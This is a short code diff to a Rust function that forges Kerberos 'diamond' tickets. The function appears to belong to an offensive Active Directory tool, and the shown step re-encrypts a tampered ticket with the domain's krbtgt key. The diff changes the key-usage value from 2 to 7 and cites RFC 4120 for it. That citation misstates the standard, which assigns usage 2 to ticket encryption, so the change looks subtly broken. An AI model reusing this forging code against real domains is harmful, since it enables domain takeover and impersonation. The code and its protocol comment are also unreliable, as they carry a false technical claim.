@@ -122,9 +122,9 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
         );
     }
 
-    // Step 4: Re-encrypt with krbtgt key
+    // Step 4: Re-encrypt with krbtgt key (key_usage=7 for TGT enc-part per RFC 4120 §7.5.1)
     info!("[diamond] Step 4: Re-encrypting ticket");
-    let re_encrypted = cipher.encrypt(&krbtgt_key, 2, &enc_ticket.build());
+    let re_encrypted = cipher.encrypt(&krbtgt_key, 7, &enc_ticket.build());
 
     let forged_ticket = Ticket {
         tkt_vno: 5,
